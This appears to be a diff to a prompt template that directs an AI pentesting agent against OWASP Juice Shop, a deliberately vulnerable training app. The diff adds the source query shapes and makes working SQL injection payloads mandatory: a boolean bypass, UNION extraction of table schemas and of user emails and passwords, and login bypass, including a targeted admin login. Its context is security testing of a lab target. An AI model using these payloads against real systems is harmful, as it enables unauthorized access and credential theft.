@@ -38,6 +38,35 @@ Each hypothesis must be specific, actionable, and grounded in evidence from the 
    - The search endpoint (`/rest/products/search?q=`) is a classic injection target
    - Login endpoint may be vulnerable to authentication bypass via SQL injection
 
+## CRITICAL: Source-Code-Derived Query Shapes
+
+Use the EXACT query shapes from the recon report's sinks section to craft precise payloads. The two most important queries are:
+
+### Search endpoint (routes/search.ts)
+```sql
+SELECT * FROM Products WHERE ((name LIKE '%<CRITERIA>%' OR description LIKE '%<CRITERIA>%') AND deletedAt IS NULL) ORDER BY name
+```
+- Your input replaces `<CRITERIA>` and is placed between `'%` and `%'`
+- To break out: close the `%'` first, then the double-parentheses `))`
+- The Products table has **9 columns**: id, name, description, price, deluxePrice, image, createdAt, updatedAt, deletedAt
+- UNION payloads MUST have exactly 9 columns to match
+
+### Login endpoint (routes/login.ts)
+```sql
+SELECT * FROM Users WHERE email = '<EMAIL>' AND password = '<HASHED_PASSWORD>' AND deletedAt IS NULL
+```
+- Email is injected directly (no hashing applied)
+- Password is hashed BEFORE concatenation, so inject ONLY via the email field
+- To bypass auth: close the `'` after email, then comment out the rest with `--`
+
+## MANDATORY Hypotheses
+
+Your output MUST include hypotheses for ALL of the following (at minimum):
+1. Boolean-based SQL injection on `/rest/products/search?q=` using `')) OR 1=1--`
+2. UNION-based SQL injection on `/rest/products/search?q=` for schema extraction (9 columns)
+3. UNION-based SQL injection on `/rest/products/search?q=` for user credential extraction
+4. Authentication bypass on `/rest/user/login` via email field injection
+
 ## Hypothesis Format
 
 For EACH hypothesis, use this EXACT format:
@@ -46,9 +75,12 @@ For EACH hypothesis, use this EXACT format:
 ### Hypothesis N
 **Endpoint:** <METHOD> <full URL path>
 **Parameter:** <parameter name>
-**Payload:** <specific injection payload>
-**Expected Result:** <what a successful injection would produce>
-**Evidence from recon:** <reference to specific endpoint/sink from recon_report.md>
+**Injection Type:** <boolean / UNION / auth bypass / blind / error-based>
+**Payload:** <specific injection payload — must account for the exact query shape>
+**URL-Encoded Payload:** <the payload with special chars URL-encoded for direct use in curl>
+**Expected Result:** <what a successful injection would produce — be specific about response differences>
+**Evidence from recon:** <reference to specific endpoint/sink from recon_report.md, including source file and line>
+**Query Shape:** <the exact SQL query from source code where this payload will be injected>
 ```
 
 ## Required Output
@@ -79,12 +111,14 @@ Produce a markdown document with the heading `## Hypotheses` followed by at leas
 ## Payload Guidelines for Juice Shop (SQLite + Sequelize)
 
 - Use SQLite-compatible syntax: `'`, `--`, `/**/`, `UNION SELECT`
-- Common effective payloads:
-  - `' OR 1=1--` (boolean-based)
-  - `' UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--` (schema extraction)
-  - `')) OR 1=1--` (for parameterised queries with parentheses)
-  - `' AND 1=2 UNION SELECT * FROM Users--` (data extraction)
-- For JSON body injection (login): try `{"email": "' OR 1=1--", "password": "x"}`
+- **Search endpoint payloads** (must close `%'` and `))` before injecting):
+  - Boolean: `qwert')) OR 1=1--` (NOT `' OR 1=1--` — that fails because it doesn't close the parentheses)
+  - UNION schema: `qwert')) UNION SELECT sql,name,'3','4','5','6','7','8','9' FROM sqlite_master WHERE type='table'--`
+  - UNION users: `qwert')) UNION SELECT id,email,password,role,'5','6','7','8','9' FROM Users--`
+- **Login endpoint payloads** (inject via email field only):
+  - Auth bypass: `' OR 1=1--` in the email field, any password
+  - Targeted admin bypass: `admin@juice-sh.op'--` in the email field
+- For JSON body injection (login): `{"email": "' OR 1=1--", "password": "x"}`
 - For NoSQL-style: try `{"email": {"$gt": ""}, "password": {"$gt": ""}}` (if MongoDB layer exists)
 
 Save the output as `hypotheses_injection.md` using the `save_deliverable` tool.
